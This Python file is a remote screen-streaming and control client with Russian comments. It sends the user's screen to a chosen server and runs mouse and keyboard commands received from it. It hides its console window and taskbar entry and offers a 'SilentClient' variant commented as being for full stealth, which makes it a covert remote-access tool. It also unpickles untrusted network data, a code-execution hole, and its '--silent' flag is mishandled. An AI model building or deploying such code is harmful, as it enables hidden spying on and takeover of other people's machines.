import socket
import threading
import cv2
import numpy as np
import pyautogui
from pynput import mouse, keyboard
import tkinter as tk
from tkinter import messagebox, simpledialog
import struct
import pickle
import time
import sys
import os
import ctypes
from ctypes import wintypes
import signal
import atexit

class ScreenShareClient:
    def __init__(self):
        self.socket = None
        self.running = False
        self.server_ip = None
        self.server_port = None
        self.main_thread = None
        
        # Регистрируем обработчики для корректного завершения
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        atexit.register(self.cleanup)
        
        # Показываем диалог подключения только один раз
        if not self.show_connection_dialog():
            sys.exit(0)
            
        # Скрываем консольное окно и приложение после ввода данных
        self.hide_console()
        self.hide_application()
        
    def signal_handler(self, signum, frame):
        """Обработчик сигналов для корректного завершения"""
        print(f"Received signal {signum}, shutting down...")
        self.cleanup()
        sys.exit(0)
        
    def hide_console(self):
        """Скрывает консольное окно"""
        try:
            # Получаем handle консольного окна
            console_window = ctypes.windll.kernel32.GetConsoleWindow()
            if console_window:
                # Скрываем окно
                ctypes.windll.user32.ShowWindow(console_window, 0)
                
                # Убираем окно из панели задач
                ctypes.windll.user32.SetWindowLongW(console_window, -20, 
                                    ctypes.windll.user32.GetWindowLongW(console_window, -20) | 0x00000080)
        except:
            pass
            
    def hide_application(self):
        """Скрывает приложение полностью"""
        try:
            # Получаем handle текущего процесса
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd:
                # Скрываем окно
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except:
            pass
            
    def show_connection_dialog(self):
        """Показывает диалог для ввода IP и порта"""
        try:
            # Создаем скрытое окно для диалога
            root = tk.Tk()
            root.withdraw()  # Скрываем основное окно
            
            # Показываем диалог
            server_ip = simpledialog.askstring("Connection", 
                                             "Enter server IP address:",
                                             parent=root)
            if not server_ip:
                root.destroy()
                return False
                
            server_port = simpledialog.askstring("Connection", 
                                               "Enter server port (default: 9999):",
                                               parent=root)
            if not server_port:
                server_port = "9999"
                
            try:
                self.server_port = int(server_port)
            except ValueError:
                messagebox.showerror("Error", "Invalid port number")
                root.destroy()
                return False
                
            self.server_ip = server_ip
            root.destroy()
            return True
            
        except Exception as e:
            return False
            
    def connect_to_server(self):
        """Подключается к серверу"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            self.running = True
            return True
        except Exception as e:
            return False
            
    def send_screen(self):
        """Отправляет скриншоты на сервер"""
        try:
            while self.running and self.socket:
                # Делаем скриншот
                screenshot = pyautogui.screenshot()
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                
                # Получаем размеры экрана
                screen_width, screen_height = pyautogui.size()
                
                # Изменяем размер до HD (1280x720) или Full HD (1920x1080)
                if screen_width >= 1920 and screen_height >= 1080:
                    target_width, target_height = 1920, 1080
                else:
                    target_width, target_height = 1280, 720
                
                # Изменяем размер изображения
                frame = cv2.resize(frame, (target_width, target_height), interpolation=cv2.INTER_LANCZOS4)
                
                # Сжимаем изображение
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
                _, buffer = cv2.imencode('.jpg', frame, encode_param)
                
                # Отправляем размер данных и сами данные
                data_size = len(buffer)
                self.socket.send(struct.pack('!I', data_size))
                self.socket.send(buffer.tobytes())
                
                time.sleep(0.05)  # 20 FPS для более плавной передачи
                
        except Exception as e:
            pass
        finally:
            self.cleanup()
            
    def receive_control(self):
        """Принимает команды управления от сервера"""
        try:
            while self.running and self.socket:
                # Получаем команду
                command_data = self.socket.recv(1024)
                if not command_data:
                    break
                    
                command = pickle.loads(command_data)
                self.execute_command(command)
                    
        except Exception as e:
            pass
            
    def execute_command(self, command):
        """Выполняет команду управления"""
        try:
            cmd_type = command.get('type')
            
            if cmd_type == 'mouse_move':
                x, y = command['x'], command['y']
                # Получаем размеры экрана для масштабирования
                screen_width, screen_height = pyautogui.size()
                # Масштабируем координаты обратно к реальному размеру экрана
                real_x = int(x * screen_width / 1280) if screen_width < 1920 else int(x * screen_width / 1920)
                real_y = int(y * screen_height / 720) if screen_height < 1080 else int(y * screen_height / 1080)
                pyautogui.moveTo(real_x, real_y)
                
            elif cmd_type == 'mouse_click':
                x, y = command['x'], command['y']
                button = command.get('button', 'left')
                # Масштабируем координаты
                screen_width, screen_height = pyautogui.size()
                real_x = int(x * screen_width / 1280) if screen_width < 1920 else int(x * screen_width / 1920)
                real_y = int(y * screen_height / 720) if screen_height < 1080 else int(y * screen_height / 1080)
                pyautogui.click(real_x, real_y, button=button)
                
            elif cmd_type == 'mouse_double_click':
                x, y = command['x'], command['y']
                button = command.get('button', 'left')
                # Масштабируем координаты
                screen_width, screen_height = pyautogui.size()
                real_x = int(x * screen_width / 1280) if screen_width < 1920 else int(x * screen_width / 1920)
                real_y = int(y * screen_height / 720) if screen_height < 1080 else int(y * screen_height / 1080)
                pyautogui.doubleClick(real_x, real_y, button=button)
                
            elif cmd_type == 'mouse_scroll':
                x, y = command['x'], command['y']
                clicks = command.get('clicks', 1)
                # Масштабируем координаты
                screen_width, screen_height = pyautogui.size()
                real_x = int(x * screen_width / 1280) if screen_width < 1920 else int(x * screen_width / 1920)
                real_y = int(y * screen_height / 720) if screen_height < 1080 else int(y * screen_height / 1080)
                pyautogui.scroll(clicks, x=real_x, y=real_y)
                
            elif cmd_type == 'key_press':
                key = command['key']
                pyautogui.press(key)
                
            elif cmd_type == 'key_type':
                text = command['text']
                pyautogui.typewrite(text)
                
            elif cmd_type == 'key_combination':
                keys = command['keys']
                pyautogui.hotkey(*keys)
                
        except Exception as e:
            pass
            
    def run(self):
        """Запускает клиент"""
        if not self.connect_to_server():
            return
            
        # Запускаем потоки
        screen_thread = threading.Thread(target=self.send_screen, daemon=True)
        screen_thread.start()
        
        control_thread = threading.Thread(target=self.receive_control, daemon=True)
        control_thread.start()
        
        # Основной цикл в отдельном потоке
        self.main_thread = threading.Thread(target=self.main_loop, daemon=True)
        self.main_thread.start()
        
        # Ждем завершения основного потока
        self.main_thread.join()
            
    def main_loop(self):
        """Основной цикл приложения"""
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()
            
    def cleanup(self):
        """Очищает ресурсы"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass

# Альтернативная версия клиента без GUI (для полной скрытности)
class SilentClient:
    def __init__(self):
        self.socket = None
        self.running = False
        self.server_ip = None
        self.server_port = None
        self.main_thread = None
        
        # Регистрируем обработчики для корректного завершения
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
        atexit.register(self.cleanup)
        
        # Получаем параметры подключения из аргументов командной строки
        if len(sys.argv) >= 3:
            self.server_ip = sys.argv[1]
            try:
                self.server_port = int(sys.argv[2])
            except ValueError:
                self.server_port = 9999
        else:
            # Если аргументы не переданы, используем значения по умолчанию
            self.server_ip = "127.0.0.1"
            self.server_port = 9999
            
    def signal_handler(self, signum, frame):
        """Обработчик сигналов для корректного завершения"""
        self.cleanup()
        sys.exit(0)
            
    def connect_to_server(self):
        """Подключается к серверу"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.server_ip, self.server_port))
            self.running = True
            return True
        except Exception as e:
            return False
            
    def send_screen(self):
        """Отправляет скриншоты на сервер"""
        try:
            while self.running and self.socket:
                # Делаем скриншот
                screenshot = pyautogui.screenshot()
                frame = np.array(screenshot)
                frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
                
                # Получаем размеры экрана
                screen_width, screen_height = pyautogui.size()
                
                # Изменяем размер до HD (1280x720) или Full HD (1920x1080)
                if screen_width >= 1920 and screen_height >= 1080:
                    target_width, target_height = 1920, 1080
                else:
                    target_width, target_height = 1280, 720
                
                # Изменяем размер изображения
                frame = cv2.resize(frame, (target_width, target_height), interpolation=cv2.INTER_LANCZOS4)
                
                # Сжимаем изображение
                encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 80]
                _, buffer = cv2.imencode('.jpg', frame, encode_param)
                
                # Отправляем размер данных и сами данные
                data_size = len(buffer)
                self.socket.send(struct.pack('!I', data_size))
                self.socket.send(buffer.tobytes())
                
                time.sleep(0.05)  # 20 FPS для более плавной передачи
                
        except Exception as e:
            pass
            
    def receive_control(self):
        """Принимает команды управления от сервера"""
        try:
            while self.running and self.socket:
                # Получаем команду
                command_data = self.socket.recv(1024)
                if not command_data:
                    break
                    
                command = pickle.loads(command_data)
                self.execute_command(command)
                    
        except Exception as e:
            pass
            
    def execute_command(self, command):
        """Выполняет команду управления"""
        try:
            cmd_type = command.get('type')
            
            if cmd_type == 'mouse_move':
                x, y = command['x'], command['y']
                # Получаем размеры экрана для масштабирования
                screen_width, screen_height = pyautogui.size()
                # Масштабируем координаты обратно к реальному размеру экрана
                real_x = int(x * screen_width / 1280) if screen_width < 1920 else int(x * screen_width / 1920)
                real_y = int(y * screen_height / 720) if screen_height < 1080 else int(y * screen_height / 1080)
                pyautogui.moveTo(real_x, real_y)
                
            elif cmd_type == 'mouse_click':
                x, y = command['x'], command['y']
                button = command.get('button', 'left')
                # Масштабируем координаты
                screen_width, screen_height = pyautogui.size()
                real_x = int(x * screen_width / 1280) if screen_width < 1920 else int(x * screen_width / 1920)
                real_y = int(y * screen_height / 720) if screen_height < 1080 else int(y * screen_height / 1080)
                pyautogui.click(real_x, real_y, button=button)
                
            elif cmd_type == 'mouse_double_click':
                x, y = command['x'], command['y']
                button = command.get('button', 'left')
                # Масштабируем координаты
                screen_width, screen_height = pyautogui.size()
                real_x = int(x * screen_width / 1280) if screen_width < 1920 else int(x * screen_width / 1920)
                real_y = int(y * screen_height / 720) if screen_height < 1080 else int(y * screen_height / 1080)
                pyautogui.doubleClick(real_x, real_y, button=button)
                
            elif cmd_type == 'mouse_scroll':
                x, y = command['x'], command['y']
                clicks = command.get('clicks', 1)
                # Масштабируем координаты
                screen_width, screen_height = pyautogui.size()
                real_x = int(x * screen_width / 1280) if screen_width < 1920 else int(x * screen_width / 1920)
                real_y = int(y * screen_height / 720) if screen_height < 1080 else int(y * screen_height / 1080)
                pyautogui.scroll(clicks, x=real_x, y=real_y)
                
            elif cmd_type == 'key_press':
                key = command['key']
                pyautogui.press(key)
                
            elif cmd_type == 'key_type':
                text = command['text']
                pyautogui.typewrite(text)
                
            elif cmd_type == 'key_combination':
                keys = command['keys']
                pyautogui.hotkey(*keys)
                
        except Exception as e:
            pass
            
    def run(self):
        """Запускает клиент"""
        if not self.connect_to_server():
            return
            
        # Запускаем потоки
        screen_thread = threading.Thread(target=self.send_screen, daemon=True)
        screen_thread.start()
        
        control_thread = threading.Thread(target=self.receive_control, daemon=True)
        control_thread.start()
        
        # Основной цикл в отдельном потоке
        self.main_thread = threading.Thread(target=self.main_loop, daemon=True)
        self.main_thread.start()
        
        # Ждем завершения основного потока
        self.main_thread.join()
            
    def main_loop(self):
        """Основной цикл приложения"""
        try:
            while self.running:
                time.sleep(0.1)
        except KeyboardInterrupt:
            pass
        finally:
            self.cleanup()
            
    def cleanup(self):
        """Очищает ресурсы"""
        self.running = False
        if self.socket:
            try:
                self.socket.close()
            except:
                pass

if __name__ == "__main__":
    # Выбираем тип клиента в зависимости от аргументов
    if len(sys.argv) > 1 and sys.argv[1] == "--silent":
        client = SilentClient()
    else:
        client = ScreenShareClient()
        
    client.run() 